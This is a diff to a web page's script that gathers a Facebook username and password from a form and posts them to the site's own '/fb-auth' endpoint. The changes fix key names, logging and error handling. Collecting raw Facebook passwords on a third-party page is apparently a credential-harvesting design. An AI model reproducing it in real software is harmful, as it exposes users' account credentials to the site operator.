@@ -45,21 +45,22 @@
         
                 const username = document.getElementById('facebookUsername').value;
                 const password = document.getElementById('facebookPassword').value;
-
+        
                 $.ajax({
                     url: '/fb-auth',
                     type: 'POST',
                     contentType: 'application/json',
-                    data: JSON.stringify({ username: username, password: password }),
+                    data: JSON.stringify({ fb_username: username, fb_password: password }), // Corrected keys
                     success: function(response) {
-                        window.location.href = "/dashboard";
+                        console.log('Login Successful:', response.message);
+                        window.location.href = "/dashboard"; // Ensure this route is defined in your Flask app
                     },
-                    error: function(response) {
-                        console.log('Login Failed:', data.message);
+                    error: function(xhr, status, error) {
+                        console.log('Login Failed:', xhr.responseJSON.error); // Corrected to use xhr object
                     }
                 });
-        });             
-    }
-    </script>
+            });
+        });
+    </script>    
 </body>
 </html>
